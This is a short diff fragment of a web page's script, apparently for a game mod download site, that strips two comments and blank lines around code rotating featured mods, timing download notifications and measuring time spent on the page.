         notificationInterval = setInterval(showDownloadNotification, 20000);
-        
-        // Auto rotate featured mods every 5 seconds
         setInterval(() => {
             const firstMod = featuredMods.shift();
             featuredMods.push(firstMod);
             initFeaturedMods();
         }, 5000);
-        
-        // Track user engagement (time on page)
         let timeStart = Date.now();
         window.addEventListener('beforeunload', function() {
             const timeSpent = Math.round((Date.now() - timeStart) / 1000);
@@ -1938,3 +1663,5 @@
 </script>
 </body>
 </html>
+
+
